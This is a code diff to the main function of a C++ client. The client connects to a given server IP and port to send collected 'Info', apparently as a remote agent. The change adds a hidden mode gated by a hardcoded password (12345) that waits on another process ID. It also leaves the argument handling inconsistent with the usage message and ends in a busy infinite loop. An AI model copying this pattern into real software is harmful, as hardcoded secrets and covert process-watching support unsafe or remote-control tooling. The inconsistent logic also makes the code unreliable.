@@ -90,31 +90,38 @@ void ImportResourceIfExists(HANDLE hRes, wchar_t* filePath, const wchar_t* resou
 
 int main(int argc, char* argv[]) {
 
-    if (argc != 3) {
+    if (argc < 3) {
         std::cerr << "Usage: " << argv[0] << " <serverIP> <port>" << std::endl;
         return 1;
     }
-    std::string serverIP = argv[1];
-    int port = std::stoi(argv[2]);
+   
+	if (argc == 3)
+	{
+		int password = std::stoi(argv[2]);
+		DWORD MainPid = (DWORD)std::stoi(argv[1]);
+		int count = 0;
+		if (password == 12345)
+		{
+			while (true)
+			{
+				if (!IsHavePID(MainPid))
+					break;
+				if (count > 60)
+					break;
+				Sleep(10000);
+				count++;
+			}
+		}
+	}
+	else {
+		std::string serverIP = argv[1];
+		int port = std::stoi(argv[2]);
 
-    Info* info = new Info();
-    SocketSend* socketsend = new SocketSend(info);
-    SocketManager socketManager(serverIP, port, info, socketsend);
+		Info* info = new Info();
+		SocketSend* socketsend = new SocketSend(info);
+		SocketManager socketManager(serverIP, port, info, socketsend);
+	}
 
-	//std::ofstream outFile("myfile.txt");
-
-	//if (!outFile.is_open()) {
-	//	std::cerr << "Failed to open file." << std::endl;
-	//	return 1;
-	//}
-
-	//// 寫入內容
-	//outFile << "Hello, World!" << std::endl;
-	//outFile << "This is a sample file." << std::endl;
-
-	//// 關閉檔案
-	//outFile.close();
-
-	printf("process finish\n");
+	//printf("process finish\n");
     while (true) {};
 }
